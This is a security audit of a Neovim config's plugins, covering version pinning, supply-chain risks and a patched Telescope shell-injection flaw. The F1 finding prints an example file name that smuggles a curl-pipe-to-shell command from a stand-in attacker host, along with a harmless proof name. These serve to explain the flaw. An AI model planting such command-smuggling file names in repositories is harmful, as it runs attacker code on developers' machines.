nvim-config Security Audit

A review of every third-party package this config installs: where each one comes from, what version is locked, and whether the code does anything it shouldn't. All packages are now pinned to exact versions.

Verdict

No malicious or suspicious code in any of the 30 plugins. One real vulnerability, a shell injection in Telescope's file previewer, is fixed by moving its pin to the upstream patch.

Before this audit only lazy-lock.json held versions, so any :Lazy update would have pulled the newest commit of every plugin. Mason servers, the Mason registry, the lazy.nvim bootstrap and the Roslyn tool all floated to "latest". Each of those is now pinned, and the config refuses to start if someone adds a plugin without a pin.

F1

Telescope previewer runs file names through the shell

HighFixed
Where
telescope.nvim/lua/telescope/previewers/buffer_previewer.lua:158 at the previously locked commit 40aedd8 (2026-08-17)
Trigger
Telescope previews a file whose type Neovim can't detect, the file utility is installed, and check_mime_type is on (the default everywhere except Windows)

To decide whether a file is binary, Telescope ran io.popen('file --mime-type -b "' .. filepath .. '"'). Double quotes don't stop $(…) or backticks, so a file in a cloned repository named something like notes$(curl -s evil.example|sh) runs that command as you as soon as it appears in a Telescope preview. I confirmed the expansion with a test file named README$(id -un>&2): the shell printed the user name.

Your main file and grep pickers are Snacks, which isn't affected, but Telescope is still used by gO, gW, grt and any :Telescope command.

Fix applied: pinned to upstream 1e1bab7 (2026-11-08, "fix(previewers): don't run file names through the shell in the mime check"). It's the only commit between the old pin and upstream master, and its diff only replaces this call with vim.system({ "file", "--mime-type", "-b", filepath }).

F2

Plugin versions were not pinned in the spec

MediumFixed

Only lazy-lock.json recorded commits. :Lazy update, :Lazy sync or U in the Lazy window would move every plugin to the head of its branch and rewrite the lockfile, so a compromised upstream commit would arrive with your next update. blink.cmp and LuaSnip also used version ranges (1.*, 2.*) that follow new tags automatically.

Fix applied: new lua/mosukiton/pins.lua holds one full SHA per plugin. plugins.lua attaches commit = <sha> to every spec, including dependencies written as plain strings, and stops with an error naming the plugin if a pin is missing. In lazy.nvim a commit takes precedence over branch and version, so updates can't move past it. All 30 pins match lazy-lock.json.

F3

lazy.nvim bootstrap followed the moving stable tag

MediumFixed

On a fresh machine the bootstrap ran git clone --branch=stable. stable is a tag that is moved on every lazy.nvim release, so new installs got whatever it pointed to that day, before the lockfile had any say.

Fix applied: the bootstrap clones, checks out the pinned SHA 306a055, confirms HEAD matches, and deletes the checkout and stops if any step fails.

F4

Mason registry and language servers floated to latest

MediumAction needed

Mason resolved packages from the newest mason-registry release, and ensure_installed took whatever version that release named. The registry is effectively code: it tells Mason which binaries to download, and Mason evaluates its template expressions as Lua (mason-core/installer/compiler/expr.lua). Mason does not verify package downloads beyond HTTPS.

Fix applied: registry pinned to github:mason-org/mason-registry@2026-11-23-caring-song (release assets confirmed present). ensure_installed now lists lua_ls@3.19.2, basedpyright@1.40.2 and clangd@23.1.0, the versions in that snapshot, and errors if a server in servers has no pin.

You need to: ensure_installed only installs missing packages, so servers you already have keep their current versions. Reinstall them once at the pinned versions (commands in Next steps).

F5

Roslyn server installed as "newest prerelease"

MediumAction needed

roslyn.lua documented dotnet tool install --global roslyn-language-server --prerelease, which installs whatever is newest on nuget.org. The package itself checks out: authored by Microsoft, project URL github.com/dotnet/roslyn, and it's the one roslyn.nvim's README points to.

Fix applied: the install comment now pins 5.13.0-1.26514.10 (newest on nuget.org, published 2026-10-15) and the version is recorded in pins.lua. This tool lives outside Neovim, so the update is yours to run.

F6

lazy.nvim loads project-local .lazy.lua files

LowFixed

With local_spec on (the default), lazy.nvim looks for .lazy.lua in the working directory and every parent. Neovim's trust prompt (vim.secure.read) guards it, but accepting the prompt in a cloned repository runs that file's Lua and lets it add plugins that never pass through your pins.

Fix applied: local_spec = false. If you rely on .lazy.lua in your own projects, those files will stop loading.

F7

lazy.nvim luarocks / hererocks support was enabled

LowFixed

When a plugin ships a rockspec with dependencies, lazy.nvim installs them from luarocks, and if luarocks isn't on your PATH it first builds Lua and LuaRocks with hererocks (-r latest). None of that is pinned. No current plugin triggers it: plenary's luassert dependency is covered by lazy's built-in community spec, and the nvim-lspconfig and telescope rockspecs only list lua and plenary.

Fix applied: rocks = { enabled = false }, so a future plugin bump can't start pulling rocks silently. checker is also explicitly off.

F8

Snacks downloads an unverified sqlite3.dll on Windows

LowOpen

Your picker config sets frecency = true, which Snacks stores in SQLite. On Windows it downloads https://www.sqlite.org/2025/sqlite-dll-win-<arch>-3480000.zip through PowerShell, extracts sqlite3.dll into Neovim's cache directory with no checksum, and loads it into the editor via LuaJIT FFI. Linux and macOS use the system libsqlite3 instead.

Recommendation (only matters on Windows): add db = { sqlite3_path = "C:/path/to/verified/sqlite3.dll" } to lua/mosukiton/snacks/picker.lua, using a DLL whose hash you've checked against sqlite.org, or set frecency = false.

F9

blink.cmp loads a prebuilt native library

LowAccepted

With fuzzy.implementation = "prefer_rust_with_warning", blink.cmp downloads its Rust fuzzy matcher for the checked-out tag (v1.10.2) from GitHub Releases with curl and loads it into Neovim. The .sha256 it checks comes from the same release, so it catches a corrupted download but not a tampered release.

I downloaded the v1.10.2 assets: the published and computed SHA-256 values match (below). The Linux library imports only libc memory, file and clock functions plus the Lua C API; no sockets, process spawning or dlopen, and no embedded URLs beyond the compiler banner. Because the pin sits on the tagged commit, the binary can't change unless the pin does. Keep the pin on a tagged commit, or blink falls back to the Lua matcher with a warning.

F10

telescope-project passes paths to :tcd unescaped

LowOpen

change_project_dir runs vim.fn.execute("tcd " .. project_path). A project directory whose name contains | would run the rest of the name as another Ex command, including ! shell commands. Your config never loads this extension (only projections is loaded, and the <leader>o mapping is commented out); telescope.lua only requires its actions module.

Recommendation: remove telescope-project.nvim from plugins.lua and pins.lua, along with the project_actions require and the project extension block in telescope.lua.

F11

Unmaintained and unused plugins

InfoOpen

Each installed plugin is code that runs with your permissions, so dead weight is worth removing.

  • projections.nvim: last commit 2023-05-18 on pre_release. Clean and small today, but no fixes will come. Consider a maintained session manager.
  • mason-tool-installer.nvim: listed as an nvim-lspconfig dependency but never set up, so it does nothing.
  • telescope-project.nvim: never loaded (see F10).
  • Comment.nvim: quiet upstream since 2024-06. Neovim 0.10+ ships gc/gcc commenting, which works with nvim-ts-context-commentstring.
F12

Treesitter parsers are pinned indirectly and not hash-checked

InfoOpen

On its main branch, nvim-treesitter downloads https://github.com/<repo>/archive/<revision>.tar.gz for each parser at the revision listed in its own parsers.lua, then compiles it. Pinning nvim-treesitter therefore pins parser sources. For your languages, bash, lua, markdown and markdown_inline use commit SHAs; c_sharp (v0.23.5) and python (v0.25.0) use tags, which their maintainers could move. Tarballs are not hash-verified.

Separately, main ignores ensure_installed, auto_install, highlight and indent from your treesitter.lua; its setup() only reads install_dir. Nothing is auto-installed, which is the safer outcome, but those settings aren't doing what they say.

Next steps

The pins only take effect once your installed copies match them.

  1. Pull this branch, open Neovim and move every plugin to the locked commits. This is what picks up the Telescope fix.

    :Lazy restore

  2. Fetch the pinned Mason registry, then reinstall the servers at their pinned versions.

    :MasonUpdate
:MasonInstall lua-language-server@3.19.2 basedpyright@1.40.2 clangd@23.1.0

  3. Pin the Roslyn server. Use update if it's already installed, install if not, then check with dotnet tool list --global.

    dotnet tool update --global roslyn-language-server --version 5.13.0-1.26514.10

  4. Optionally confirm the blink.cmp library on disk matches the hash above (Linux path shown).

    sha256sum ~/.local/share/nvim/lazy/blink.cmp/target/release/libblink_cmp_fuzzy.so

  5. To upgrade a plugin later: read the upstream diff between the old and new SHA, change the SHA in pins.lua, run :Lazy update <name> (it checks out the new pin and rewrites lazy-lock.json), and commit both files together.

How this was checked

What was done

  • Cloned all 30 plugins from their canonical GitHub repositories and checked out the locked commits.
  • Confirmed each SHA is reachable from an upstream branch or tag, and recorded its tag, date and distance from upstream.
  • Scanned all 5,303 tracked files for process execution, network access, dynamic code (load, loadstring, dofile, luaeval), obfuscation (long base64, escape runs, string.char chains, XOR), credential and shell-profile paths, and environment reads. Reviewed all 1,010 hits in context.
  • Listed every binary and build file (Makefiles, CMake, build.rs, rockspecs, submodules) and every startup entry point (plugin/, ftplugin/, after/).
  • Searched upstream commits made after each locked commit for security fixes. That surfaced the Telescope patch.
  • Verified external artifacts: blink.cmp release hashes and imports, the jsregexp submodule commits, NuGet metadata for the Roslyn tool, and the Mason registry release assets.

Limits

  • This is a static review. Large plugins (snacks.nvim, telescope.nvim, nvim-lspconfig, nvim-treesitter, mason.nvim, lazy.nvim) were reviewed through the scan hits and their download, build and execution paths, not read line by line.
  • The language servers Mason installs, the treesitter parser sources and the Roslyn server were not audited themselves; only how they are fetched and pinned.
  • The config wasn't started here: the sandbox blocked downloading a Neovim binary. Every changed Lua file passes a Lua parser, and a script confirmed that all 30 repositories referenced in plugins.lua have a pin and that the pins match lazy-lock.json.
  • kickstart.lua in the repo root isn't loaded by init.lua, so its separate, unpinned bootstrap never runs.
